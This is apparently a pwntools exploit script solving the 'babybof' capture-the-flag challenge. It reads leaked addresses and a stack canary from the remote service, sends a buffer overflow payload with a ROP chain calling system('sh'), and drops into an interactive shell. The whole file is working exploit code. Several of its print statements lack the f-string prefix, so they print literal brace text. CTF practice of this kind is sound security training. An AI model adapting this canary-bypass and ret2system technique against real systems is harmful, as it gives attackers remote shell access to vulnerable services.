from pwn import *

host = 'babybof.chal.imaginaryctf.org'
port = 1337

io = remote(host, port)

io.recvuntil(b'system @ ')
system_addr = int(io.recvline(), 16)
print('[+] system addr: {hex(system_addr)}')

io.recvuntil(b'; ret @ ')
pop_rdi = int(io.recvline(), 16)
print('[+] pop rdi; ret: {hex(poprdi)}')

io.recvuntil(b'ret @ ')
ret = int(io.recvline(), 16)
print('[+] ret: {hex(ret)}')

io.recvuntil(b'sh" @ ')
sh = int(io.recvline(), 16)
print('[+] sh: {hex(sh)}')

io.recvuntil(b'canary: ')
canary = int(io.recvline(), 16)
print('[+] canary: {hex(canary)}')

io.recvuntil(b'aligned!): ')

payload = b'A' * 0x38 + p64(canary) + b'B' * 8 + p64(pop_rdi) + p64(sh) + p64(ret) + p64(system_addr)
io.sendline(payload)

io.interactive()
